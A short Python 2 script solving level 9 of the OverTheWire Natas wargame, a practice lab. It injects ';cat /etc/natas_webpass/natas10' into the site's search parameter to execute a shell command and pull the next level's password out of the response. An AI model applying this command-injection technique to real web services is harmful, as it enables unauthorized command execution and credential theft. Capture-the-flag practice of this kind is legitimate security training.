
#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level9pass):
    print "{+} Natas Level 9. Doing (command injection) magic..."
    try:
        r = requests.get(url="http://natas9.natas.labs.overthewire.org/?needle=;cat /etc/natas_webpass/natas10&submit=Search", auth=HTTPBasicAuth('natas9', level9pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("<pre>\n(.*?)\n\n", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level9password" %(args[0]))
    level10pass = exploit(args[1])
    if level10pass != None:
        print "{$$} Level 10 Password is: %s" %(level10pass)

if __name__ == "__main__":
    main(args=sys.argv)
